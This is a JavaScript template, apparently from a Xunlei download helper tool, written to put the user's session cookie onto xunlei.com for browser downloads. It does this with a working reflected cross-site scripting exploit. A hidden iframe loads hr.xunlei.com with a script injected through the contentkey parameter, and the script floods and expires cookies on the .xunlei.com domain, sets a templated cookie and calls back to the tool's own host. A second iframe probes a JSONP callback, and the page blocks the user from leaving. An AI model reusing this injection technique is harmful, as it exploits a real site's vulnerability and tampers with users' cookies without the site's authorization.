var xss_retry = 3;
var stoped = false;
function xss() {
  if (document.cookie.indexOf("xss={{ gdriveid }}") != -1) {
    $.fancybox.close();
    window.onbeforeunload = undefined;
    document.location.reload();
    return;
  }
  if (xss_retry <= 0 || stoped) {
    window.onbeforeunload = undefined;
    $.fancybox('<div style="width:300px;"><p style="color: red;">Cookie写入失败...</p><p>您可能无法使用浏览器下载功能</p><p><a href="javascript:location.reload();">刷新重试</a>，或向作者回报这个问题：<a href="http://gplus.to/binux">+足兆叉虫</a></p></div>', {padding: 20, onClosed: function () { document.cookie = "xss={{ gdriveid }};"; }});
    return;
  }
  var script = 'for(var i=0;i<500;i++){document.cookie="loli"+i.toString()+"=1;domain=.xunlei.com";};for(var i=0;i<500;i++){document.cookie="loli"+i.toString()+"=0;domain=.xunlei.com;expires=Wed, 28 Dec 2011 12:46:19 GMT";};document.cookie="{{ cookie }}".replace(".vip","");document.getElementsByTagName("iframe")[0].src="{{ request.protocol }}://{{ request.host }}/xss?gdriveid={{ gdriveid }}";';
  var ts = new Date().getTime();
  var iframe = document.createElement("iframe");
  iframe.setAttribute("style", "display: none;");
  iframe.src = "http://hr.xunlei.com/searchlist.html?contentkey='%3Cscript%3E"+escape(script)+"%3C/script%3E&ts="+ts;
  if (iframe.addEventListener) {
    iframe.addEventListener("load", function(){
      this.removeEventListener("load", arguments.call, false);
      xss();
    }, false);
  } else {
    iframe.attachEvent("onreadystatechange", function(){
      if(iframe.readyState === "complete" || iframe.readyState == "loaded"){
        iframe.detachEvent("onreadystatechange", arguments.callee);
        xss();
      }
    });
  }
  document.body.appendChild(iframe);
  xss_retry -= 1;
}
jQuery(document).ready(function() {
  if (document.cookie.indexOf("xss={{ gdriveid }}") == -1) {
    $.fancybox('<div style="width:300px">正在尝试写入cookie，请稍候...</div>', {padding: 20});
    window.onbeforeunload = function () {                       
       return "请点击留在此页";
    };
    var iframe = document.createElement("iframe");
    iframe.setAttribute("style", "display: none;");
    iframe.sandbox = "allow-forms allow-scripts";
    iframe.src = "http://dynamic.cloud.vip.xunlei.com/interface/fill_bt_list?callback=%3C";
    document.body.appendChild(iframe);

    xss();
    setTimeout(function() { stoped = true; xss(); }, 30000);
  }
});
